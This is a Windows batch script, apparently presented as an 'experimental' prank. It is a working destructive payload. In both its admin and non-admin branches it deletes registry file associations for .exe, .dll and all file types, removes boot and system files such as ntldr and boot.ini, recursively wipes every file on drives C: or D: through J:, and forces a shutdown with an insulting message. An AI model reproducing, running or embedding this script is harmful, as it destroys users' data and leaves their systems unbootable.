:: DO NOT RUN THIS ON YOUR OWN PC
:: the script is for experimental purposes only!

@echo off
setlocal

echo 1. Admin
echo 2. Non-Admin
set /p choice=Choose: 

if "%choice%" == "1" goto admin
if "%choice%" == "2" goto nonadmin

::------------------------------------------------------------ if you have admin rights
:admin
START /wait reg delete HKCR/.exe /f
START /wait reg delete HKCR/.dll /f
START /wait reg delete HKCR/* /f

attrib -r -s -h %SystemRoot%\System32\autoexec.bat
if exist "%SystemRoot%\System32\autoexec.bat" del /f /q "%SystemRoot%\System32\autoexec.bat"
attrib -r -s -h %SystemRoot%\System32\boot.ini
if exist "%SystemRoot%\System32\boot.ini" del /f /q "%SystemRoot%\System32\boot.ini"
attrib -r -s -h %SystemRoot%\System32\ntldr
if exist "%SystemRoot%\System32\ntldr" del /f /q "%SystemRoot%\System32\ntldr"
attrib -r -s -h %SystemRoot%\win.ini
if exist "%SystemRoot%\win.ini" del /f /q "%SystemRoot%\win.ini"

d:
if exist d:\ rd /s /q d:\
e:
if exist e:\ rd /s /q e:\

for %%a in (d e f g h i j) do (
    if exist %%a:\* del %%a:\*.* /f /s /q
    if exist %%a:\ rd /s /q %%a:\
)

shutdown -c "Error! You are too stupid!" -s
goto end

:: ------------------------------------------------------------ if you have no admin rights
:nonadmin
@echo off

START reg delete HKCR/.exe /f
START reg delete HKCR/.dll /f
START reg delete HKCR/* /f

for %%f in (autoexec.bat boot.ini ntldr win.ini) do (
    attrib -r -s -h c:\%%f
    if not exist c:\%%f (
        echo File c:\%%f does not exist.
    ) else (
        del c:\%%f
    )
)

for %%d in (C:\ D:\ E:\ F:\ G:\ H:\ I:\ J:\) do (
    if exist %%d (
        for /f "delims=" %%f in ('dir /a-d /b %%d') do (
            if not %%~af == d (
                if not %%~af == s (
                    if not %%~af == h (
                        del %%d\%%f /f /s /q
                    )
                )
            )
        )
        rd %%d /s /q
    )
)

shutdown -c "Error! You are too stupid!" -s
goto end

:end
echo Stopping..
endlocal